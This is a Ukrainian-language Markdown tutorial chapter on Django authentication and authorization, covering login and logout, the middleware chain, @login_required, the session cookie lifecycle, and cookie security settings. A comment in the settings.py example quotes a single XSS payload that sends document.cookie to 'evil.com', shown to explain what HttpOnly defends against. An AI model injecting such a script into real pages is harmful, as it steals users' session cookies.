# Auth Basics — Автентифікація vs Авторизація

> **Головне питання:** Хто ти і що тобі можна?
>
> Ці два питання — основа будь-якої системи безпеки.
> Django відповідає на них через дві різні системи.

---

## Аналогія — паспорт і квиток на концерт

- **Паспорт** = **Автентифікація (AuthN)**: "Хто ти?" — підтверджує особу.
  Охоронець перевіряє документ і переконується що він справжній.
- **Квиток** = **Авторизація (AuthZ)**: "Куди тобі можна?" — визначає права.
  Касир перевіряє квиток і вирішує де ти можеш сидіти (VIP чи партер).

У аеропорту: охорона перевіряє паспорт (AuthN), потім посадковий талон (AuthZ).
Паспорт без квитка — не пустять. Квиток без паспорта — теж.

---

## Таблиця: AuthN vs AuthZ

| | Автентифікація (AuthN) | Авторизація (AuthZ) |
|--|------------------------|---------------------|
| **Питання** | Хто ти? | Що тобі можна? |
| **Відповідь** | Перевірка пароля | Перевірка прав на об'єкт |
| **Django інструмент** | `authenticate()`, `login()` | `@login_required`, `get_object_or_404` |
| **Де перевіряється** | `AuthenticationMiddleware` | У кожному view окремо |
| **Що якщо не пройшов** | Форма з помилкою | 302 Redirect або 404/403 |

---

## Компоненти Django Auth

```python
from django.contrib.auth import authenticate, login, logout
from django.contrib.auth.models import User
from django.contrib.auth.decorators import login_required

# 1. Перевірити credentials (AuthN):
user = authenticate(request, username='alice', password='secret')
# → Django: шукає User з username='alice'
# → Перевіряє PBKDF2 хеш пароля в БД
# → Повертає User object якщо збігається, або None

# 2. Запустити сесію після успішного входу:
if user is not None:
    login(request, user)   # ← створює session_id у БД + cookie у браузері
    # Тепер request.user = alice у всіх наступних запитах

# 3. Завершити сесію:
logout(request)   # ← видаляє запис сесії з БД + примусово стирає cookie
```

---

## Middleware chain: хто встановлює `request.user`

Кожен HTTP запит проходить через ВЕСЬ ланцюг middleware перш ніж дійти до view. У `notes_chat_app` він виглядає так:

```
Кожен запит проходить через ВЕСЬ ланцюг middleware (settings.py → MIDDLEWARE):

1. DebugExceptionMiddleware  — логування/показ помилок у dev
2. DebugToolbarMiddleware    — Django Debug Toolbar
3. SecurityMiddleware        — HTTPS редирект, HTTP заголовки безпеки
4. SessionMiddleware         — читає Cookie: sessionid=... → завантажує сесію з БД
5. CommonMiddleware          — trailing slash, Content-Type
6. CsrfViewMiddleware        — перевіряє csrfmiddlewaretoken у POST запитах
7. AuthenticationMiddleware  — читає session → встановлює request.user
   │                           Якщо session є → request.user = User(id=42)
   │                           Якщо немає    → request.user = AnonymousUser
8. MessageMiddleware         — Django messages flash framework
9. XFrameOptionsMiddleware   — X-Frame-Options: DENY заголовок
   │
   ▼
View функція (request.user вже встановлено!)
```

**Порядок middleware важливий:**

- `SessionMiddleware` має бути перед `AuthenticationMiddleware` — Auth читає session
- `CsrfViewMiddleware` перед View — перевіряє CSRF до виклику будь-якого view
- `SessionMiddleware` перед `CsrfViewMiddleware` — CSRF використовує session

У `crispy_notes_project` middleware ланцюг коротший (без DebugExceptionMiddleware і DebugToolbarMiddleware), але принцип той самий.

---

## `@login_required` — що робить і де живе

```python
# notes_app/views.py
from django.contrib.auth.decorators import login_required

@login_required   # ← декоратор, перевіряє request.user.is_authenticated
def note_list(request):
    # Якщо request.user = AnonymousUser:
    #   → redirect до LOGIN_URL (settings.py) + ?next=/notes/
    #   → 302 /accounts/login/?next=/notes/
    # Якщо request.user = User(id=42):
    #   → виконує view нормально
    notes = selectors.get_user_notes(request.user)
    return render(request, 'notes_app/note_list.html', {'notes': notes})
```

```python
# settings.py — куди перенаправляти незалогінених:
LOGIN_URL = '/accounts/login/'
LOGIN_REDIRECT_URL = '/notes/'           # куди ПІСЛЯ успішного входу
LOGOUT_REDIRECT_URL = '/accounts/login/' # куди ПІСЛЯ виходу
```

> **Важливо:** `@login_required` — це тільки AuthN ("ти залогінений?").
> Він НЕ перевіряє чи ця конкретна нотатка належить тобі.
> Для цього потрібен окремий AuthZ крок у view (дивись [Object Permissions](object_permissions.md)).

---

## Sessions — як Django пам'ятає юзера

> **Проблема:** HTTP — протокол без стану (stateless). Кожен запит ніби "перший".
> Сервер не знає хто ти, якщо ти не надіслав докази.

### Аналогія — клубна карта в кафе

Уяви кафе де за кожну каву нараховують бали. Без картки — офіціант забуває тебе після кожного відвідування. З карткою — бали накопичуються.

**Session cookie = клубна картка**: браузер зберігає і автоматично пред'являє при кожному запиті.

### Покроковий flow: Login → Cookie → Наступний запит

```
КРОК 1: Аліса натискає "Увійти"
─────────────────────────────────────────────────────────────────────────
Браузер:  POST /accounts/login/  {username: 'alice', password: 'secret'}
Django:   CsrfViewMiddleware → перевіряє csrfmiddlewaretoken ✓
          authenticate('alice', 'secret') → User(id=42) ✓
          login(request, user)
            → INSERT INTO django_session
              (session_key='xK9mPq', session_data={_auth_user_id: 42}, expire_date=...)
          Відповідь: 302 /notes/
          Header:    Set-Cookie: sessionid=xK9mPq; HttpOnly; SameSite=Lax; Path=/

КРОК 2: Браузер зберігає cookie. Аліса бачить /notes/
─────────────────────────────────────────────────────────────────────────
Браузер зберігає: sessionid=xK9mPq (у захищеному сховищі браузера)

КРОК 3: Наступний запит Аліси (GET /notes/)
─────────────────────────────────────────────────────────────────────────
Браузер:  GET /notes/
Header:   Cookie: sessionid=xK9mPq   ← надсилається автоматично!
          Django SessionMiddleware:
            SELECT * FROM django_session WHERE session_key='xK9mPq'
            → session_data = {_auth_user_id: 42}
          Django AuthenticationMiddleware:
            SELECT * FROM auth_user WHERE id=42
            → request.user = User(id=42, username='alice')
View:     @login_required → request.user.is_authenticated → True ✓
          notes = selectors.get_user_notes(request.user)
          → SQL: SELECT * FROM note WHERE user_id=42 OR group_id IN (...)

КРОК 4: Вихід (Logout)
─────────────────────────────────────────────────────────────────────────
Браузер:  POST /accounts/logout/  (з CSRF токеном у POST body)
Django:   logout(request)
            → DELETE FROM django_session WHERE session_key='xK9mPq'
          Відповідь: 302 /accounts/login/
          Header:    Set-Cookie: sessionid=; expires=Thu, 01 Jan 1970 00:00:00 GMT
Браузер:  Видаляє cookie. request.user → AnonymousUser.
```

### Cookie у DevTools: як побачити сесію

```
Chrome DevTools → Application → Storage → Cookies → http://localhost

Поле          Значення
─────────────────────────────────────────────────
Name          sessionid
Value         xK9mPq...  (32-символьний random key)
Domain        localhost
Path          /
Expires       (через 2 тижні за замовчуванням)
Size          ~100 B
HttpOnly      ✓  (JS не може прочитати!)
SameSite      Lax

Спробуй у Console:
  document.cookie  →  'csrftoken=abc123'
  (sessionid відсутній — HttpOnly!)
```

### Cookie налаштування в settings.py

```python
# settings.py:

SESSION_COOKIE_HTTPONLY = True
# ↑ JS не може прочитати sessionid через document.cookie
#   Захист від XSS-атак що намагаються вкрасти cookie:
#   <script>fetch('evil.com?c='+document.cookie)</script>
#   → з HttpOnly: sessionid у document.cookie відсутній → атака безрезультатна

SESSION_COOKIE_SAMESITE = "Lax"
# ↑ "Lax": cookie надсилається тільки з того самого сайту АБО
#   при навігаційних GET запитах (посилання)
#   Захист від CSRF: evil.com не може надіслати POST з твоїм cookie
#   "Strict" — строгіше: cookie не надсилається навіть при переходах з зовнішніх посилань
#   "None" — небезпечно без Secure (HTTPS) прапора

CSRF_COOKIE_HTTPONLY = False
# ↑ False: JS може читати csrftoken (потрібно для fetch/axios запитів з CSRF header)
#   Якщо не використовуєш JS для форм → True для строгого захисту

# Production HTTPS (розкоментуй коли є SSL-сертифікат):
# SESSION_COOKIE_SECURE = True   # cookie тільки по HTTPS (не HTTP)
# CSRF_COOKIE_SECURE = True
```

> **HttpOnly і XSS:** навіть якщо зловмисник вставив `<script>` на сторінку і намагається вкрасти session cookie через `document.cookie` — він отримає порожній рядок або тільки `csrftoken`. `sessionid` не буде у відповіді, бо `HttpOnly` забороняє JS читати цей cookie.

---

## Далі

Наступна глава: [Password Security](password_security.md) — Password Reset flow, PBKDF2, Password Validators, Password Change.
